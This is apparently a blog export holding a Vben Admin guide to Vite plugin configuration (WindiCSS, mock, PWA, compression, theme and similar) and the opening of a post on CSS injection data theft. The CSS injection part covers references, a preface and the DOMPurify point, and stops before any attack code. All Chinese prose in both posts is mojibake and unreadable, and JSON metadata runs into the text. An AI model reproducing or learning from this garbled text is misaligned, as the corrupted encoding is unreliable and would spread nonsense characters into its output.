windicssçš„é…ç½® tailwindçš„é…ç½® tailwind.config.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 import lineClamp from \u0026#39;windicss/plugin/line-clamp\u0026#39;; import colors from \u0026#39;windicss/colors\u0026#39;; import { defineConfig } from \u0026#39;vite-plugin-windicss\u0026#39;; import { primaryColor } from \u0026#39;./build/config/themeConfig\u0026#39;; export default defineConfig({ darkMode: \u0026#39;class\u0026#39;, plugins: [lineClamp, createEnterPlugin()], theme: { extend: { colors: { ...colors, primary: primaryColor, }, screens: { sm: \u0026#39;576px\u0026#39;, md: \u0026#39;768px\u0026#39;, lg: \u0026#39;992px\u0026#39;, xl: \u0026#39;1200px\u0026#39;, \u0026#39;2xl\u0026#39;: \u0026#39;1600px\u0026#39;, }, }, }, }); /** * Used for animation when the element is displayed * @param maxOutput The larger the maxOutput output, the larger the generated css volume */ function createEnterPlugin(maxOutput = 10) { const createCss = (index: number, d = \u0026#39;x\u0026#39;) =\u0026gt; { const upd = d.toUpperCase(); return { [`*\u0026gt; .enter-${d}:nth-child(${index})`]: { transform: `translate${upd}(50px)`, }, [`*\u0026gt; .-enter-${d}:nth-child(${index})`]: { transform: `translate${upd}(-50px)`, }, [`* \u0026gt; .enter-${d}:nth-child(${index}),* \u0026gt; .-enter-${d}:nth-child(${index})`]: { \u0026#39;z-index\u0026#39;: `${10 - index}`, opacity: \u0026#39;0\u0026#39;, animation: `enter-${d}-animation 0.4s ease-in-out 0.3s`, \u0026#39;animation-fill-mode\u0026#39;: \u0026#39;forwards\u0026#39;, \u0026#39;animation-delay\u0026#39;: `${(index * 1) / 10}s`, }, }; }; const handler = ({ addBase }) =\u0026gt; { const addRawCss = {}; for (let index = 1; index \u0026lt; maxOutput; index++) { Object.assign(addRawCss, { ...createCss(index, \u0026#39;x\u0026#39;), ...createCss(index, \u0026#39;y\u0026#39;), }); } addBase({ ...addRawCss, [`@keyframes enter-x-animation`]: { to: { opacity: \u0026#39;1\u0026#39;, transform: \u0026#39;translateX(0)\u0026#39;, }, }, [`@keyframes enter-y-animation`]: { to: { opacity: \u0026#39;1\u0026#39;, transform: \u0026#39;translateY(0)\u0026#39;, }, }, }); }; return { handler }; } å‰µå»ºé…ç½®æ–‡ä»¶ build/vite/plugin/windicss.ts 1 2 3 4 5 6 7 8 9 10 11 12 import type { Plugin } from \u0026#39;vite\u0026#39;; import windiCSS from \u0026#39;vite-plugin-windicss\u0026#39;; export function configWindiCssPlugin(): Plugin[] { return windiCSS({ safelist: \u0026#39;no-select\u0026#39;, preflight: { enableAll: true, }, }); } æ‡‰ç”¨é…ç½® build/vite/plugin/index.ts 1 2 3 4 5 6 7 8 9 // ... import { configWindiCssPlugin } from \u0026#39;./windicss\u0026#39;; export function createVitePlugins(viteEnv: ViteEnv, isBuild: boolean) { // ... // vite-plugin-windicss vitePlugins.push(configWindiCssPlugin()); return vitePlugins; } å°å…¥æ¨£å¼ src/main.ts 1 2 3 // ... import \u0026#39;@virtual/windi.css\u0026#39;; // ... Viteæ’ä»¶-vite-plugin-mock èªªæ˜ vite-plugin-mockçš„npmé¦–é \næ ¹æ“šæˆ‘è‡ªå·±çš„å¯¦é©—ï¼š\nlocalEnabledæ§åˆ¶mocké–‹ç™¼ç’°å¢ƒæ˜¯å¦å•Ÿå‹•ã€‚\nå¦‚æœç”Ÿç”¢ç’°å¢ƒæƒ³è¦ä½¿ç”¨mockï¼Œåªæœ‰prodEnabledç‚ºtrueï¼ŒinjectCodeæ³¨å…¥æŒ‡å®šä»£ç¢¼æ™‚æ‰æœƒç”Ÿæ•ˆã€‚\nå®‰è£ 1 yarn add mockjs vite-plugin-mock --dev ç·¨å¯«Mockç”¨ä¾‹ é€™è£¡ç›´æ¥å°‡æ ¹ç›®éŒ„ä¸‹çš„mockç›®éŒ„æ‹·è²å‡ºä¾†å°±è¡Œã€‚\nmock\\_util.tsï¼šè£¡é¢å°è£çš„æ˜¯æ•¸æ“šè«‹æ±‚çµæ§‹é¡å‹ã€‚ mock\\_createProductionServer.tsï¼šç”¨æ–¼é…ç½®ç”Ÿç”¢ç’°å¢ƒå‹•æ…‹Mockçš„jsæ–‡ä»¶ï¼Œæ–‡æª”ä¸­æœ‰èªªã€‚ å…¶ä»–çš„ï¼šéƒ½æ˜¯Mockç”¨ä¾‹ï¼Œæ¯ä¸€å€‹jsã€tsï¼Œéƒ½è¦é»˜èªå°å‡ºä¸€å€‹MockMethodé¡å‹çš„æ•¸çµ„ã€‚æ¯ä¸€é …MockMethodå°±æ˜¯æ””æˆªçš„ä¸€å€‹æ–¹æ³•ã€‚MockMethodçš„responseå°æ‡‰æ–¹æ³•çš„returnå°‡æœƒè¢«Mockå¯¦ä¾‹è™•ç†ã€‚ä¹Ÿå°±æ˜¯èªªï¼Œä½ å¯ä»¥åœ¨returnçš„å°åƒä¸­ä½¿ç”¨Mockè¦å‰‡ã€‚ ä¸é_createProductionServer.tsä¸­ä½¿ç”¨äº†Glob å°å…¥ã€‚\né…ç½®Mock build/vite/plugin/mock.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 /** * Mock plugin for development and production. * https://github.com/anncwb/vite-plugin-mock */ import { viteMockServe } from \u0026#39;vite-plugin-mock\u0026#39;; export function configMockPlugin(isBuild: boolean) { return viteMockServe({ // â†“ å¿½ç•¥ä»¥_é–‹é ­çš„æ–‡ä»¶ ignore: /^\\_/, // â†“ è§£ææ ¹ç›®éŒ„ä¸‹çš„mockæ–‡ä»¶å¤¾ mockPath: \u0026#39;mock\u0026#39;, localEnabled: !isBuild, prodEnabled: isBuild, injectCode: ` import { setupProdMockServer } from \u0026#39;../mock/_createProductionServer\u0026#39;; setupProdMockServer(); `, }); } é…ç½®é€²Vite build/vite/plugin/index.ts 1 2 3 4 5 6 7 8 9 10 // ... import { configMockPlugin } from \u0026#39;./mock\u0026#39;; export function createVitePlugins(viteEnv: ViteEnv, isBuild: boolean, pkg: any) { // ... // vite-plugin-mock VITE_USE_MOCK \u0026amp;\u0026amp; vitePlugins.push(configMockPlugin(isBuild)); return vitePlugins; } Viteæ’ä»¶-vite-plugin-purge-icons èªªæ˜ æœ¬ç« çš„æ’ä»¶æ˜¯å¯ä»¥è®“æˆ‘å€‘å¾ˆæ–¹ä¾¿é«˜æ•ˆçš„ä½¿ç”¨Iconifyä¸­æ‰€æœ‰çš„åœ–æ¨™ã€‚\né€™è£¡è¦è¬›çš„æ˜¯Iconifyå„å€‹ç‰ˆæœ¬æ’ä»¶çš„å€åˆ¥ï¼š\nVue3ç‰ˆIconifyæ’ä»¶ï¼šä½¿ç”¨æ™‚éœ€è¦å®‰è£æŒ‡å®šåº«çš„åœ–æ¨™ï¼Œç„¶å¾Œéœæ…‹å¼•ç”¨ã€‚æ¯ä¸€æ¬¡å¼•ç”¨éƒ½æœƒç”¢ç”Ÿä¸€æ¬¡httpè«‹æ±‚ã€‚ PurgeIconsï¼šå°‡æˆ‘å€‘æ‰€ä½¿ç”¨çš„Iconifyåœ–æ¨™éƒ½å·²htmlçš„domç¯€é»å½¢å¼ä¿å­˜åœ¨htmlä¸­ï¼Œé€™æ¨£æˆ‘å€‘å°±å¯ä»¥ä¸ç™¼é€httpè«‹æ±‚å°±å¯ä»¥ä½¿ç”¨åœ–æ¨™äº†ã€‚ vite-plugin-purge-iconsï¼šå°±æ˜¯Viteç‰ˆçš„PurgeIconsã€‚ vite-plugin-purge-iconsçš„npmé¦–é \nå®‰è£ 1 2 yarn add @iconify/iconify yarn add vite-plugin-purge-icons @iconify/json --dev é…ç½®Vite build/vite/plugin/index.ts 1 2 3 4 5 6 7 8 9 10 11 // ... import PurgeIcons from \u0026#39;vite-plugin-purge-icons\u0026#39;; export function createVitePlugins(viteEnv: ViteEnv, isBuild: boolean) { // ... // vite-plugin-purge-icons vitePlugins.push(PurgeIcons()); // ... return vitePlugins; } æ³¨æ„ Iconçµ„ä»¶å¾Œé¢å†å°è£ï¼Œç”±æ–¼æˆ‘å€‘main.tsä¸­æ²’æœ‰å¼•å…¥vite-plugin-purge-iconsã€‚æ‰€ä»¥ï¼Œé€™è£¡é‚„ä¸èƒ½ä½¿ç”¨ã€‚å¾Œé¢æœƒå‹•æ…‹ç”Ÿæˆåœ–æ¨™ã€‚\nViteæ’ä»¶-vite-plugin-style-import èªªæ˜ vite-plugin-style-importçš„npmé¦–é \nè©²æ’ä»¶å¯æŒ‰éœ€å°å…¥çµ„ä»¶åº«æ¨£å¼ï¼Œç”±æ–¼ vite æœ¬èº«å·²æŒ‰éœ€å°å…¥äº†çµ„ä»¶åº«ï¼Œå› æ­¤åƒ…æ¨£å¼ä¸æ˜¯æŒ‰éœ€å°å…¥çš„ï¼Œå› æ­¤åªéœ€æŒ‰éœ€å°å…¥æ¨£å¼å³å¯ã€‚\nå®‰è£ 1 yarn add vite-plugin-style-import --dev é…ç½®æ’ä»¶ build/vite/plugin/styleImport.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 /** * Introduces component library styles on demand. * https://github.com/anncwb/vite-plugin-style-import */ import styleImport from \u0026#39;vite-plugin-style-import\u0026#39;; export function configStyleImportPlugin() { // if (!isBuild) return []; const pwaPlugin = styleImport({ libs: [ { libraryName: \u0026#39;ant-design-vue\u0026#39;, esModule: true, resolveStyle: (name) =\u0026gt; { return `ant-design-vue/es/${name}/style/index`; }, }, ], }); return pwaPlugin; } é…ç½®Vite build/vite/plugin/index.ts 1 2 3 4 5 6 7 8 9 10 // ... import { configStyleImportPlugin } from \u0026#39;./styleImport\u0026#39;; export function createVitePlugins(viteEnv: ViteEnv, isBuild: boolean, pkg: any) { // ... // vite-plugin-style-import vitePlugins.push(configStyleImportPlugin()); return vitePlugins; } Viteæ’ä»¶-rollup-plugin-visualizer èªªæ˜ rollup-plugin-visualizerçš„npmé¦–é ï¼šä¾è³´åˆ†ææ’ä»¶ã€‚ cross-envçš„npmé¦–é ï¼šå‘½ä»¤è¡Œé…ç½®ç’°å¢ƒè®Šé‡ã€‚ å®‰è£ 1 yarn add rollup-plugin-visualizer @types/rollup-plugin-visualizer --dev é…ç½®æ’ä»¶ build/vite/plugin/visualizer.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 /** * Package file volume analysis */ import visualizer from \u0026#39;rollup-plugin-visualizer\u0026#39;; import { isReportMode } from \u0026#39;../../utils\u0026#39;; import type { Plugin } from \u0026#39;vite\u0026#39;; export function configVisualizerConfig() { if (isReportMode()) { return visualizer({ filename: \u0026#39;./node_modules/.cache/visualizer/stats.html\u0026#39;, open: true, // @ts-ignore gzipSize: true, // @ts-ignore brotliSize: true, }) as Plugin; } return []; } é…ç½®Vite build/vite/plugin/index.ts 1 2 3 4 5 6 7 8 9 10 // ... import { configVisualizerConfig } from \u0026#39;./visualizer\u0026#39;; export function createVitePlugins(viteEnv: ViteEnv, isBuild: boolean, pkg: any) { // ... // rollup-plugin-visualizer vitePlugins.push(configVisualizerConfig()); return vitePlugins; } å®‰è£cross-env 1 yarn add cross-env --dev ç·¨è¼¯è…³æœ¬ package.json 1 2 3 4 5 6 7 8 9 { // ... \u0026#34;scripts\u0026#34;: { // ... \u0026#34;report\u0026#34;: \u0026#34;cross-env REPORT=true npm run build\u0026#34; // ... } // ... } Viteæ’ä»¶-vite-plugin-theme èªªæ˜ vite-plugin-themeçš„npmé¦–é ï¼šGitç«™é»ï¼Œnpmçš„å¤±æ•ˆäº†ã€‚\nç”¨æ–¼å‹•æ…‹æ›´æ”¹ç•Œé¢ä¸»é¡Œè‰²çš„ vite æ’ä»¶ã€‚\né…ç½®æ’ä»¶ build/vite/plugin/theme.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 /** * Vite plugin for website theme color switching * https://github.com/anncwb/vite-plugin-theme */ import { viteThemePlugin, mixLighten, mixDarken, tinycolor } from \u0026#39;vite-plugin-theme\u0026#39;; import { getThemeColors, generateColors } from \u0026#39;../../config/themeConfig\u0026#39;; export function configThemePlugin() { const colors = generateColors({ mixDarken, mixLighten, tinycolor, }); const plugin = viteThemePlugin({ // â†“ ä¹‹å‰ç”Ÿæˆçš„å¾ˆå¤šå€‹é¡è‰² colorVariables: [...getThemeColors(), ...colors], }); return plugin; } é…ç½®Vite build/vite/plugin/index.ts 1 2 3 4 5 6 7 8 9 10 // ... import { configThemePlugin } from \u0026#39;./theme\u0026#39;; export function createVitePlugins(viteEnv: ViteEnv, isBuild: boolean, pkg: any) { // ... //vite-plugin-theme vitePlugins.push(configThemePlugin()); return vitePlugins; } ä¿®æ”¹ä¸»é¡Œæ–¹æ³• ä¹‹å¾Œè¦ä¿®æ”¹ä¸»é¡Œï¼Œç›´æ¥èª¿ç”¨ä¸€ä¸‹é€™å€‹æ–¹æ³•å³å¯ã€‚\nsrc/logics/theme/index.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 import { getThemeColors, ThemeMode, generateColors } from \u0026#39;../../../build/config/themeConfig\u0026#39;; import { replaceStyleVariables } from \u0026#39;vite-plugin-theme/es/client\u0026#39;; import { mixLighten, mixDarken, tinycolor } from \u0026#39;vite-plugin-theme/es/colorUtils\u0026#39;; export async function changeTheme(color: string, theme?: ThemeMode) { const colors = generateColors({ mixDarken, mixLighten, tinycolor, color, }); return await replaceStyleVariables({ colorVariables: [...getThemeColors(color, theme), ...colors], }); } Viteæ’ä»¶-vite-plugin-imagemin èªªæ˜ vite-plugin-imageminçš„npmé¦–é ï¼šä¸€å€‹å£“ç¸®åœ–ç‰‡è³‡æºçš„ vite æ’ä»¶ã€‚\né…ç½®é¡åƒ(ç”¨æ–¼å®‰è£imageminçš„ä¾è³´ï¼Œå› ç‚ºä¸­åœ‹å¯èƒ½æ²’æœ‰å®‰è£imageminã€‚) è‹¥éä¸­åœ‹ç”¨æˆ¶ï¼Œå¯è·³éé…ç½®é¡åƒ\npackage.json 1 2 3 4 \u0026#34;resolutions\u0026#34;: { \u0026#34;//\u0026#34;: \u0026#34;ç”¨æ–¼å®‰è£imageminçš„ä¾è³´é—œä¿‚ï¼Œå› ç‚ºä¸­åœ‹å¯èƒ½æ²’æœ‰å®‰è£imageminã€‚\u0026#34;, \u0026#34;bin-wrapper\u0026#34;: \u0026#34;npm:bin-wrapper-china\u0026#34; }, å®‰è£ 1 yarn add vite-plugin-imagemin --dev é…ç½®æ’ä»¶ build/vite/plugin/imagemin.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 // Image resource files used to compress the output of the production environment // https://github.com/anncwb/vite-plugin-imagemin import viteImagemin from \u0026#39;vite-plugin-imagemin\u0026#39;; export function configImageminPlugin() { const plugin = viteImagemin({ gifsicle: { optimizationLevel: 7, interlaced: false, }, optipng: { optimizationLevel: 7, }, webp: { quality: 75, }, mozjpeg: { quality: 8, }, pngquant: { quality: [0.8, 0.9], speed: 4, }, svgo: { plugins: [ { removeViewBox: false, }, { removeEmptyAttrs: false, }, ], }, }); return plugin; } é…ç½®Vite build/vite/plugin/index.ts 1 2 3 4 5 6 7 8 9 10 11 12 // ... import { configImageminPlugin } from \u0026#39;./imagemin\u0026#39;; export function createVitePlugins(viteEnv: ViteEnv, isBuild: boolean, pkg: any) { // ... if (isBuild) { //vite-plugin-imagemin VITE_USE_IMAGEMIN \u0026amp;\u0026amp; vitePlugins.push(configImageminPlugin()); } return vitePlugins; } Viteæ’ä»¶-vite-plugin-compression èªªæ˜ vite-plugin-compressionçš„npmé¦–é ï¼švite-plugin-compressçš„å¢å¼·ç‰ˆï¼Œå£“ç¸®ç”¨çš„ã€‚\nå®‰è£ 1 yarn add vite-plugin-compression --dev é…ç½®æ’ä»¶ build/vite/plugin/compress.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 /** * Used to package and output gzip. Note that this does not work properly in Vite, the specific reason is still being investigated * https://github.com/anncwb/vite-plugin-compression */ import type { Plugin } from \u0026#39;vite\u0026#39;; import compressPlugin from \u0026#39;vite-plugin-compression\u0026#39;; export function configCompressPlugin(compress: \u0026#39;gzip\u0026#39; | \u0026#39;brotli\u0026#39; | \u0026#39;none\u0026#39;): Plugin | Plugin[] { const compressList = compress.split(\u0026#39;,\u0026#39;); const plugins: Plugin[] = []; if (compressList.includes(\u0026#39;gzip\u0026#39;)) { plugins.push( compressPlugin({ ext: \u0026#39;.gz\u0026#39;, }) ); } if (compressList.includes(\u0026#39;brotli\u0026#39;)) { plugins.push( compressPlugin({ ext: \u0026#39;.br\u0026#39;, algorithm: \u0026#39;brotliCompress\u0026#39;, }) ); } return plugins; } é…ç½®Vite build/vite/plugin/index.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 // ... import { configCompressPlugin } from \u0026#39;./compress\u0026#39;; export function createVitePlugins(viteEnv: ViteEnv, isBuild: boolean, pkg: any) { // ... // The following plugins only work in the production environment if (isBuild) { // ... // rollup-plugin-gzip vitePlugins.push(configCompressPlugin(VITE_BUILD_COMPRESS)); } return vitePlugins; } Viteæ’ä»¶-vite-plugin-pwa èªªæ˜ vite-plugin-pwaçš„npmé¦–é ï¼šPWAä¸€äº›æŠ€è¡“é›†æˆã€‚ Service Worker-åƒè€ƒéˆæ¥ PWA-MDNèªªæ˜ Bç«™-PWAé»‘é¦¬å…¬é–‹èª²æ•™å­¸ å®‰è£ 1 yarn add vite-plugin-pwa --dev é…ç½®æ’ä»¶ build/vite/plugin/pwa.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 /** * Zero-config PWA for Vite * https://github.com/antfu/vite-plugin-pwa */ import type { ViteEnv } from \u0026#39;../../utils\u0026#39;; import { VitePWA } from \u0026#39;vite-plugin-pwa\u0026#39;; export function configPwaConfig(env: ViteEnv) { const { VITE_USE_PWA, VITE_GLOB_APP_TITLE, VITE_GLOB_APP_SHORT_NAME } = env; if (VITE_USE_PWA) { // vite-plugin-pwa const pwaPlugin = VitePWA({ manifest: { name: VITE_GLOB_APP_TITLE, short_name: VITE_GLOB_APP_SHORT_NAME, icons: [ { // ./è¡¨ç¤ºpublicæ–‡ä»¶å¤¾ src: \u0026#39;./resource/img/pwa-192x192.png\u0026#39;, sizes: \u0026#39;192x192\u0026#39;, type: \u0026#39;image/png\u0026#39;, }, { src: \u0026#39;./resource/img/pwa-512x512.png\u0026#39;, sizes: \u0026#39;512x512\u0026#39;, type: \u0026#39;image/png\u0026#39;, }, ], }, }); return pwaPlugin; } return []; } é…ç½®Vite build/vite/plugin/index.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 // ... import { configPwaConfig } from \u0026#39;./pwa\u0026#39;; export function createVitePlugins(viteEnv: ViteEnv, isBuild: boolean, pkg: any) { // ... // The following plugins only work in the production environment if (isBuild) { // ... // vite-plugin-pwa vitePlugins.push(configPwaConfig(viteEnv)); } return vitePlugins; } Viteé…ç½®-optimizeDeps.include èªªæ˜ Viteé…ç½®-optimizedeps-includeèªªæ˜\nåŸæ–‡ï¼š\né¡å‹ï¼š string[]\né»˜èªæƒ…æ³ä¸‹ï¼Œä¸åœ¨ node_modules ä¸­çš„ï¼Œéˆæ¥çš„åŒ…ä¸æœƒè¢«é æ§‹å»ºã€‚ä½¿ç”¨æ­¤é¸é …å¯å¼·åˆ¶é æ§‹å»ºéˆæ¥çš„åŒ…ã€‚\nå®‰è£moment antdä¸­éœ€è¦ä½¿ç”¨momentã€‚è€Œmomenté…ç½®å’Œæœ¬ç« æœ‰é—œï¼Œæ‰€ä»¥å°±é †ä¾¿å®‰è£ä¸€ä¸‹ï¼š\n1 yarn add moment é…ç½®Vite vite.config.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 // ... function pathResolve(dir: string) { return resolve(__dirname, \u0026#39;.\u0026#39;, dir); } export default ({ command, mode }: ConfigEnv): UserConfig =\u0026gt; { // ... return { // ... optimizeDeps: { // @iconify/iconify: The dependency is dynamically and virtually loaded by @purge-icons/generated, so it needs to be specified explicitly include: [ \u0026#39;@iconify/iconify\u0026#39;, \u0026#39;ant-design-vue/es/locale/zh_CN\u0026#39;, \u0026#39;moment/dist/locale/zh-cn\u0026#39;, \u0026#39;ant-design-vue/es/locale/en_US\u0026#39;, \u0026#39;moment/dist/locale/eu\u0026#39;, ], // ... }, }; }; Viteé…ç½®-optimizeDeps.exclude èªªæ˜ Viteé…ç½®-optimizedeps-excludeèªªæ˜\nåŸæ–‡ï¼š\né¡å‹ï¼š string[]\nåœ¨é æ§‹å»ºä¸­å¼·åˆ¶æ’é™¤çš„ä¾è³´é …ã€‚\né…ç½®Vite vite.config.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 // ... export default ({ command, mode }: ConfigEnv): UserConfig =\u0026gt; { // ... return { // ... optimizeDeps: { // ... exclude: [\u0026#39;vue-demi\u0026#39;], }, }; }; http-server èªªæ˜ é …ç›®ç·¨è­¯ä¹‹å¾Œçš„éœæ…‹æ–‡ä»¶æ˜¯ä¸èƒ½ç›´æ¥æœ¬åœ°è¨ªå•çš„ã€‚å› ç‚ºæœ¬åœ°è¨ªå•ä½¿ç”¨çš„æ˜¯file:///å”è­°ã€‚è€Œfile:///ä¸æ”¯æŒè·¨åŸŸå’Œä¸€äº›å…¶ä»–ç‰¹æ€§ã€‚æ¯”å¦‚JavaScriptæ¨¡å¡Šã€PWAç­‰ç­‰ã€‚\né‚£éº¼æ­¤æ™‚å°±éœ€è¦æ›ä¸€ç¨®è¨ªå•æœ¬åœ°æ–‡ä»¶çš„æ–¹å¼äº†ï¼Œå°±æ˜¯è®“æœ¬åœ°æˆç‚ºä¸€å€‹æœå‹™å™¨ã€‚é€šéhttpä¾†è¨ªå•ã€‚\nhttp-serverå°±å¯ä»¥å¯¦ç¾ä»¥httpå½¢å¼è¨ªå•æœ¬åœ°æ–‡ä»¶çš„ç›®çš„ï¼Œä½†æ˜¯é€™å€‹ä¾è³´ä¸ä¿è­‰å®‰å…¨ï¼Œåªç”¨æ–¼æœ¬åœ°æ¸¬è©¦ã€‚\nhttp-serverçš„npmé¦–é ï¼šå‘½ä»¤è¡Œå•Ÿå‹•ä¸€å€‹æœ¬åœ°æœå‹™å™¨ã€‚ä¸å®‰å…¨ï¼Œä½†æ˜¯å¯ä»¥ç”¨ä¾†æ¸¬è©¦ã€‚\nå®‰è£ 1 yarn add http-server --dev é…ç½®è…³æœ¬ package.json 1 2 3 4 5 6 7 8 9 10 { // ... \u0026#34;scripts\u0026#34;: { // ... \u0026#34;test:gzip\u0026#34;: \u0026#34;http-server dist --cors --gzip -c-1\u0026#34;, \u0026#34;test:br\u0026#34;: \u0026#34;http-server dist --cors --brotli -c-1\u0026#34;, // ... }, // ... } ","date":"2022-10-12T00:00:00Z","image":"https://live.staticflickr.com/65535/52422113584_3af97c79da_o.png","permalink":"https://wayneblog.ga/2022-10-12/vben-admin-guide/","title":"Vben Admin æŒ‡å—èˆ‡ Vite é…ç½®"},{"content":" ç”¨ CSS ä¾†å·è³‡æ–™ - CSS injectionï¼ˆä¸Šï¼‰ åƒè€ƒæ–‡ç«  ç”¨ CSS ä¾†å·è³‡æ–™ - CSS injection - Huli CSS Injection Attacks CSS Injection Primitives HackTricks - CSS Injection Stealing Data in Great style â€“ How to Use CSS to Attack Web Application. Data Exfiltration via CSS + SVG Font Data Exfiltration via CSS + SVG Font - PoC (Safari only) CSS data exfiltration in Firefox via a single injection point å‰è¨€ åœ¨è¬›åˆ°é‡å°ç¶²é å‰ç«¯çš„æ”»æ“Šæ™‚ï¼Œä½ æˆ‘çš„å¿ƒä¸­æµ®ç¾çš„å…«æˆæœƒæ˜¯ XSSï¼Œä½†å¦‚æœä½ æ²’è¾¦æ³•åœ¨ç¶²é ä¸ŠåŸ·è¡Œ JavaScriptï¼Œæœ‰æ²’æœ‰å…¶ä»–çš„æ”»æ“Šæ‰‹æ³•å‘¢ï¼Ÿä¾‹å¦‚èªªï¼Œå‡è¨­å¯ä»¥æ’å…¥ style æ¨™ç±¤ï¼Œä½ èƒ½å¤ åšäº›ä»€éº¼ï¼Ÿ\nåœ¨ 2018 å¹´çš„æ™‚å€™ï¼Œæˆ‘æœ‰å¯«éä¸€ç¯‡ CSS keyloggerï¼šæ”»æ“Šèˆ‡é˜²ç¦¦ï¼Œé‚£æ™‚å‰›å¥½åœ¨ Hacker News ä¸Šé¢çœ‹åˆ°ç›¸é—œçš„è¨è«–ï¼Œæ–¼æ˜¯å°±èŠ±äº†é»æ™‚é–“ç ”ç©¶äº†ä¸€ä¸‹ã€‚\nè€Œ 4 å¹´å¾Œçš„ç¾åœ¨ï¼Œæˆ‘å¾è³‡å®‰çš„è§’åº¦é‡æ–°èªè­˜äº†é€™å€‹æ”»æ“Šæ‰‹æ³•ï¼Œå› æ­¤æ‰“ç®—å¯«ä¸€å…©ç¯‡æ–‡ç« ä¾†å¥½å¥½è¬›è§£ CSS injectionã€‚\né€™ç¯‡çš„æ–‡ç« å…§å®¹åŒ…å«ï¼š\nä»€éº¼æ˜¯ CSS injectionï¼Ÿ CSS å·è³‡æ–™çš„åŸç† å¦‚ä½•å· hidden input çš„è³‡æ–™ å¦‚ä½•å· meta çš„è³‡æ–™ æ‰¿ä¸Šï¼Œä¸¦ä»¥ HackMD ç‚ºä¾‹ ä»€éº¼æ˜¯ CSS injectionï¼Ÿ é¡§åæ€ç¾©ï¼ŒCSS injection ä»£è¡¨çš„æ˜¯ä½ åœ¨ä¸€å€‹é é¢ä¸Šå¯ä»¥æ’å…¥ä»»ä½•çš„ CSS èªæ³•ï¼Œæˆ–æ˜¯è¬›å¾—æ›´æ˜ç¢ºä¸€é»ï¼Œä½ å¯ä»¥ä½¿ç”¨ \u0026lt;style\u0026gt; é€™å€‹æ¨™ç±¤ã€‚ä½ å¯èƒ½æœƒå¥½å¥‡ï¼Œç‚ºä»€éº¼æœƒæœ‰é€™ç¨®ç‹€æ³ï¼Ÿ\næˆ‘è‡ªå·±èªç‚ºå¸¸è¦‹çš„ç‹€æ³æœ‰å…©å€‹ï¼Œç¬¬ä¸€å€‹æ˜¯ç¶²ç«™æœ‰éæ¿¾æ‰è¨±å¤šæ¨™ç±¤ï¼Œä½†ä¸è¦ºå¾— \u0026lt;style\u0026gt; æœ‰å•é¡Œï¼Œæ‰€ä»¥æ²’æœ‰éæ¿¾æ‰ã€‚ä¾‹å¦‚èªªå¾ˆå¤šç¶²ç«™éƒ½æœƒç”¨ç¾æˆçš„ library ä¾†è™•ç† sanitizationï¼Œå…¶ä¸­æœ‰ä¸€å¥—å¾ˆæœ‰åçš„å«åš DOMPurifyã€‚\nåœ¨ DOMPurify(v2.4.0) ä¹‹ä¸­ï¼Œé è¨­å°±æœƒå¹«ä½ æŠŠå„ç¨®å±éšªçš„æ¨™ç±¤å…¨éƒ½éæ¿¾æ‰ï¼Œåªç•™ä¸‹ä¸€äº›å®‰å…¨çš„ï¼Œä¾‹å¦‚èªª \u0026lt;h1\u0026gt; æˆ–æ˜¯ \u0026lt;p\u0026gt; é€™ç¨®ï¼Œè€Œé‡é»æ˜¯ \u0026lt;style\u0026gt; ä¹Ÿåœ¨é è¨­çš„å®‰å…¨æ¨™ç±¤è£¡é¢ï¼Œæ‰€ä»¥å¦‚æœä½ æ²’æœ‰ç‰¹åˆ¥æŒ‡å®šåƒæ•¸ï¼Œåœ¨é è¨­çš„ç‹€æ³ä¸‹ï¼Œ\u0026lt;style\u0026gt; æ˜¯ä¸æœƒè¢«éæ¿¾æ‰çš„ï¼Œå› æ­¤æ”»æ“Šè€…å°±å¯ä»¥æ³¨å…¥ CSSã€‚\nç¬¬äºŒç¨®ç‹€æ³å‰‡æ˜¯é›–ç„¶å¯ä»¥æ’å…¥ HTMLï¼Œä½†æ˜¯ç”±æ–¼ CSPï¼ˆContent Security Policyï¼‰çš„ç·£æ•…ï¼Œæ²’æœ‰è¾¦æ³•åŸ·è¡Œ JavaScriptã€‚æ—¢ç„¶æ²’è¾¦æ³•åŸ·è¡Œ JavaScriptï¼Œå°±åªèƒ½é€€è€Œæ±‚å…¶æ¬¡ï¼Œçœ‹çœ‹æœ‰æ²’æœ‰è¾¦æ³•åˆ©ç”¨ CSS åšå‡ºä¸€äº›æƒ¡æ„è¡Œç‚ºã€‚\né‚£åˆ°åº•æœ‰äº† CSS injection ä¹‹å¾Œå¯ä»¥å¹¹å˜›ï¼ŸCSS ä¸æ˜¯æ‹¿ä¾†è£é£¾ç¶²é ç”¨çš„è€Œå·²å—ï¼Ÿé›£é“å¹«ç¶²é çš„èƒŒæ™¯æ›é¡è‰²ä¹Ÿå¯ä»¥æ˜¯ä¸€å€‹æ”»æ“Šæ‰‹æ³•ï¼Ÿ\nåˆ©ç”¨ CSS å·è³‡æ–™ CSS ç¢ºå¯¦æ˜¯æ‹¿ä¾†è£é£¾ç¶²é ç”¨çš„ï¼Œä½†æ˜¯åªè¦çµåˆå…©å€‹ç‰¹æ€§ï¼Œå°±å¯ä»¥ä½¿ç”¨ CSS ä¾†å·è³‡æ–™ã€‚\nç¬¬ä¸€å€‹ç‰¹æ€§ï¼šå±¬æ€§é¸æ“‡å™¨ã€‚\nåœ¨ CSS 